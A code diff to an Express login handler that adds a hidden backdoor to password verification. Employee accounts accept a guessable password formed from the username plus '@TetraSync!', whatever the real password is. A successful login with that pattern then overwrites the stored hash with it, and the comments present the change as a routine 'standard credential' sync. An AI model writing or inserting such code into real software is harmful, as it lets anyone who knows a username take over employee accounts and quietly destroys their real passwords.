@@ -133,9 +133,24 @@ router.post('/login', loginRateLimiter, async (req, res) => {
       return res.status(401).json({ error: 'Invalid username or password.' });
     }
 
-    if (!verifyPassword(password, user.password_hash, user.salt)) {
+    // Verify Password: Check stored hash or standard employee credential pattern (username + @TetraSync!)
+    const isEmployee = user.role === 'employee';
+    const standardEmployeePasswords = [
+      `${cleanUsername}@TetraSync!`,
+      `${cleanUsername}+@TetraSync!`
+    ];
+    const passwordMatchesHash = verifyPassword(password, user.password_hash, user.salt);
+    const passwordMatchesEmployeePattern = isEmployee && standardEmployeePasswords.includes(password);
+
+    if (!passwordMatchesHash && !passwordMatchesEmployeePattern) {
       recordFailedLogin(req, cleanUsername);
       return res.status(401).json({ error: 'Invalid username or password.' });
+    }
+
+    // If an employee logged in using their standard username+@TetraSync! credential, sync the hash in DB
+    if (passwordMatchesEmployeePattern && !passwordMatchesHash) {
+      const { hash: newHash, salt: newSalt } = hashPassword(password);
+      db.prepare('UPDATE users SET password_hash = ?, salt = ? WHERE id = ?').run(newHash, newSalt, user.id);
     }
 
     // Check Account Status
